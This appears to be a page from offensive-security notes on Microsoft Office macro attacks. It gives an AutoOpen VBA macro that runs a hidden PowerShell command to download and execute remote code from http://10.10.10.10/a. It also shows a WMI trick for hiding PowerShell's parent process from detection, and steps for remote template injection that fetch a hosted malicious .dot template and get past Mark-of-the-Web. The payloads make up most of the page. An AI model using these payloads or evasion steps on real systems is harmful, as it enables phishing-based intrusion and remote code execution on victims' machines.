---
title: Microsoft Office Macros
category: Client Side Attacks
order: 2
---

# Visual Basic for Applications (VBA) Macro

VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. 

VBA is not all that different from VBScript, so it's not too difficult to use the `wscript.shell object`.


> **Note**: The file must be saved in `.doc` format due inside `.docx` files cannot save macros.

To create a macro go to `View -> Macros` and create one.

![Macro](/hackingnotes/images/macro-create.png)

> **Note**: It's important to select the document in order to save the macro inside.

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

![Macro](/hackingnotes/images/macro-calc.png)

> **Note**: To force the macro to trigger automatically when the document is opened, use the name`AutoOpen()`.

## Executing a Powershell Payload

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""

End Sub
```

# Changing Prent-Child Relationship

When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.

With `wmi` we can create another parent process and append the powershell to wmi and not to the MS Word.


```VB
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```


> **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.


# Remote Template Injection


Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script.

* Create a word add a macro and save it as `Word 97-2003 Template (.dot)`. This will be out malicious remote template, and we can also host this file.
* Next, create a new document from the blank template located in `C:\Users\User\Documents\Custom Office Templates`. Add any content and save it as `.docx`.
* Browse to the directory in explorer, right-click and select `7-zip -> Open Archive`. Navigate to `word -> _rels`, right-click on `settings.xml.rels` and select Edit. Change the Target entry and specify out hosted template.

```
Target="http://10.10.10.10/template.dot"
```
This will allow to execute the macro even if its flagged with MOTW.
